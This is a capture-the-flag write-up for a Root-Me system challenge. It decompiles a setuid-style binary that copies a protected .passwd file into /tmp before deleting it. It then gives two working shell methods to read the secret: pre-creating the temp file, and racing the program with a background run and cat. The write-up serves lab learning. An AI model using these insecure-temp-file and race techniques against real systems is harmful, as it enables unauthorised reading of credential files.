### S0lv3d by H4yicl3

First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```
I use IDA to analysis the code.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+14h] [bp-Ch]@4
  int v5; // [sp+18h] [bp-8h]@7
  char v6; // [sp+1Fh] [bp-1h]@10

  if ( ptrace(0, 0, 1, 0) < 0 )
  {
    puts("[-] Don't use a debugguer !");
    abort();
  }
  //open the file /tmp/tmp_file.txt
  v4 = open("/tmp/tmp_file.txt", 0x41, 0x124);
  if ( v4 == -1 )
  {
    perror("[-] Can't create tmp file ");
    exit(0);
  }
  //open the file .passwd we need
  v5 = open("/challenge/app-systeme/ch12/.passwd", 0);
  if ( v5 == -1 )
  {
    perror("[-] Can't open file ");
    exit(0);
  }
  while ( read(v5, &v6, 1u) == 1 )
    write(v4, &v6, 1u);
  close(v5);
  close(v4);
  //sleep 250ms 
  usleep(250000u);
  //then deleted the file store password
  unlink("/tmp/tmp_file.txt");
  return 0;
}
```
we need to see the file /tmp/tmp_file.txt before it deleted

the easy way is create the /tmp/tmp_file.txt with full permission
then run a program !!
when progam running it open the file our /tmp/tmp_file.txt with permission write but when this program unlink !! file still exist !! 
Because this file can not delete by program !!
```
touch /tmp/tmp_file.txt
chmod +rwx /tmp/tmp_file.txt
./ch12
cat /tmp/tmp_file.txt
```

the other way is !!
first run ch12 in background, then sleep to wait for tmp_file.txt creation, finally cat it. 
(./ch12 &);sleep 0.1;cat /tmp/tmp_file.txt

we get flag!!


